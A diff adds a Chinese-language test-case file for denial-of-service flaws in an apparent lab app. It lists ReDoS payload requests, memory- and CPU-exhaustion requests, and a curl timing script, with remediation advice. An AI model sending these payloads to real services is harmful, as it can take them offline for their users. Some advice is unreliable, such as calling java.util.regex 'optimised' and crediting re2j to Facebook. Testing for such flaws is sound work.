@@ -1,0 +1,306 @@
+# DoS (Denial of Service) 漏洞测试用例
+# 漏洞类型: 拒绝服务
+# 危险等级: 中危 (Medium)
+# 警告: 这些测试可能导致服务暂时不可用！
+
+# ============================================
+# 1. ReDoS - 正则表达式回溯攻击
+# ============================================
+# 原理: 某些正则表达式在特定输入下会产生指数级回溯
+# 检测: 测量响应时间，明显延迟表示存在漏洞
+
+# 经典 ReDoS - 嵌套量词
+# 正则: ^(a+)+$
+# 正常: aaaaa -> 快速匹配
+# 恶意: aaaaaaaaaaaaaaaaaaaaaaaa! -> 回溯爆炸
+GET /dos/regex?input=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!
+
+# 变体: 使用更多字符
+GET /dos/regex?input=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!
+
+# 变体: 使用不同的分隔符
+GET /dos/regex?input=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@
+GET /dos/regex?input=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa#
+
+
+# ============================================
+# 2. Email 验证 ReDoS
+# ============================================
+
+# 恶意 Email 格式
+GET /dos/regex/email?email=aaaaaaaaaaaaaaaaaaaaaaaaaaa@bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
+
+# 包含多个 @
+GET /dos/regex/email?email=aaaaaaaaaaaaaaaaaaaaaaaaaaa@b....................
+
+# 前导大量字符
+GET /dos/regex/email?email=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@b.com
+
+
+# ============================================
+# 3. URL 验证 ReDoS
+# ============================================
+
+# 恶意 URL 格式
+GET /dos/regex/url?url=aaaaaaaaaaaaaaaaaaaaaaa.com/a....................................................................................................................................
+
+# 长域名
+GET /dos/regex/url?url=aaaaaaaaaaaaaaaaaaaaaa................................................................................
+
+# 多层路径
+GET /dos/regex/url?url=a.com/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/
+
+
+# ============================================
+# 4. 重叠字符类 ReDoS
+# ============================================
+# 正则: ^([a-z]+.*)+$
+
+# 字符 + 大量点号
+GET /dos/regex/overlap?input=aaaaaaaaaaaaaaaaaaaaaaa.......................................................................................
+
+# 字符 + 空格
+GET /dos/regex/overlap?input=aaaaaaaaaaaaaaaaaaaaaaa
+
+
+# ============================================
+# 5. 交替分组 ReDoS
+# ============================================
+# 正则: ^(a|a*)+$
+# 这会产生大量空匹配选项
+
+GET /dos/regex/alt?input=aaaaaaaaaaaaaaaaaaaaaaaaaaaa!
+
+# 变体
+GET /dos/regex/alt?input=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!
+
+
+# ============================================
+# 6. Memory DoS - 数组分配
+# ============================================
+
+# 小尺寸 (正常)
+GET /dos/memory/array?size=1000
+
+# 大尺寸 (可能导致延迟)
+GET /dos/memory/array?size=100000
+
+# 超大尺寸 (受限)
+GET /dos/memory/array?size=10000000
+
+
+# ============================================
+# 7. Memory DoS - 字符串重复
+# ============================================
+
+# 正常
+GET /dos/memory/string?str=test&times=100
+
+# 大量重复
+GET /dos/memory/string?str=a&times=10000
+
+# 超大字符串 (受限)
+GET /dos/memory/string?str=aaaaaaaa&times=100000
+
+
+# ============================================
+# 8. CPU DoS - 斐波那契数列
+# ============================================
+# 递归算法: O(2^n) 复杂度
+
+# 小数值 (正常)
+GET /dos/cpu/fib?n=30
+
+# 中等数值 (明显延迟)
+GET /dos/cpu/fib?n=40
+
+# 大数值 (严重延迟，受限)
+GET /dos/cpu/fib?n=45
+
+
+# ============================================
+# 9. CPU DoS - 嵌套循环
+# ============================================
+# 复杂度: O(n^3)
+
+# 小数值 (正常)
+GET /dos/cpu/loop?n=50
+
+# 中等数值 (明显延迟)
+GET /dos/cpu/loop?n=200
+
+# 大数值 (严重延迟，受限)
+GET /dos/cpu/loop?n=1000
+
+
+# ============================================
+# 10. 安全版本测试 (应该快速响应)
+# ============================================
+
+# 安全正则 (输入长度受限)
+GET /dos/safe/regex?input=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!
+
+# 安全斐波那契 (迭代算法)
+GET /dos/safe/cpu/fib?n=45
+
+
+# ============================================
+# 11. ReDoS 检测方法
+# ============================================
+
+# 方法 1: 时间测量
+# 步骤:
+# 1. 发送正常输入，记录响应时间 T1
+# 2. 发送恶意输入，记录响应时间 T2
+# 3. 如果 T2 >> T1 (如 T2 > 3秒)，存在 ReDoS
+
+# 方法 2: 资源监控
+# - 监控 CPU 使用率
+# - 监控内存使用
+# - 监控响应时间
+
+# 方法 3: 超时测试
+# - 设置合理的超时时间
+# - 如果请求超时，可能存在 DoS
+
+
+# ============================================
+# 12. 自动化测试脚本示例
+# ============================================
+
+#!/bin/bash
+# ReDoS 时间检测脚本
+
+# 测试正常输入
+start1=$(date +%s%N)
+curl "http://localhost:8080/dos/regex?input=aaa"
+end1=$(date +%s%N)
+normal_time=$((end1 - start1))
+
+# 测试恶意输入
+start2=$(date +%s%N)
+curl "http://localhost:8080/dos/regex?input=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!"
+end2=$(date +%s%N)
+attack_time=$((end2 - start2))
+
+# 判断
+if [ $attack_time -gt 3000000000 ]; then  # 3秒
+    echo "存在 ReDoS 漏洞！"
+    echo "正常时间: $((normal_time / 1000000))ms"
+    echo "攻击时间: $((attack_time / 1000000))ms"
+fi
+
+
+# ============================================
+# 13. 常见危险正则模式
+# ============================================
+
+# 1. 嵌套量词
+# (a+)+, (a*)*, (a+)*, (a*)+
+
+# 2. 重复分组
+# (a|a)+, (a|a*)+, (aa|a)+
+
+# 3. 重叠字符类
+# [a-z]+.*[a-z]+, (.*)*(.*)
+
+# 4. 复杂嵌套
+# ^(.*)*(.*)*$/, ((.*)*)*
+
+# 5. 交替空匹配
+# (a|)*, (a|b)**, (a|)+
+
+
+# ============================================
+# 14. 受影响的常见场景
+# ============================================
+
+# 1. 用户输入验证
+# - Email 验证
+# - URL 验证
+# - 电话号码验证
+# - IP 地址验证
+
+# 2. 日志分析
+# - 日志搜索
+# - 日志过滤
+
+# 3. 数据处理
+# - 文本解析
+# - 数据提取
+
+
+# ============================================
+# 15. 修复建议
+# ============================================
+
+# 1. 使用非回溯正则引擎
+# - Java: 使用 java.util.regex (已优化)
+# - 考虑使用 re2j (Facebook RE2)
+
+# 2. 避免危险模式
+# - 不使用嵌套量词
+# - 不使用重复分组
+# - 简化正则表达式
+
+# 3. 输入验证
+# - 限制输入长度
+# - 过滤特殊字符
+
+# 4. 超时机制
+# - 设置正则匹配超时
+# - 使用独立的线程池
+
+# 5. 性能测试
+# - 对正则进行性能测试
+# - 使用恶意输入测试
+
+
+# ============================================
+# 16. re2j 使用示例
+# ============================================
+
+# 依赖:
+# <dependency>
+#     <groupId>com.google.re2j</groupId>
+#     <artifactId>re2j</artifactId>
+#     <version>1.7</version>
+# </dependency>
+
+# 代码:
+# import com.google.re2j.Pattern;
+# import com.google.re2j.Matcher;
+#
+# Pattern pattern = Pattern.compile("^(a+)+$");
+# Matcher matcher = pattern.matcher(input);
+# boolean matches = matcher.matches();
+
+
+# ============================================
+# 17. 真实案例
+# ============================================
+
+# 案例 1: Cloudflare (2019)
+# - 漏洞: ReDoS in reverse proxy
+# - 影响: 全球 CDN 服务中断
+# - 原因: 恶意正则导致 CPU 100%
+
+# 案例 2: Stack Overflow (2016)
+# - 漏洞: Post 标题正则验证 ReDoS
+# - 影响: 服务延迟
+# - 修复: 限制输入长度
+
+# 案例 3: Node.js 库 (2019)
+# - 漏洞: 多个 npm 包存在 ReDoS
+# - 影响: 依赖这些包的应用受影响
+
+
+# ============================================
+# 18. 参考资料
+# ============================================
+
+# - OWASP: Regular Expression Denial of Service (ReDoS)
+# - CWE: CWE-1333 (Inefficient Regular Expression Complexity)
+# - OWASP Regex DoS: https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS
+# - re2j: https://github.com/google/re2j
+# - Regular Expressions and DoS: https://www.regular-expressions.info/catastrophic.html
